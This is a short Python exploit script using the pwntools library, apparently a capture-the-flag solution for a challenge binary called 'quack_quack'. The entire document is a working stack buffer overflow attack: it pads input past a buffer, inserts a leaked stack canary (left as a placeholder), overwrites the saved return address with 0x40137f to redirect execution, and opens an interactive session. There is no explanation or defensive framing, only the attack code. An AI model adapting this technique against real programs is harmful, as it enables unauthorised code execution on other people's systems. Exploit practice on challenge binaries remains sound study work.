
from pwn import *

p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './quack_quack'])
canary = b'--canary-hex--'  # Change to canary-hex
payload = b'Quack Quack ' + b'A'*52 + canary + b'B'*8 + p64(0x40137f)
p.sendline(payload)
p.interactive()
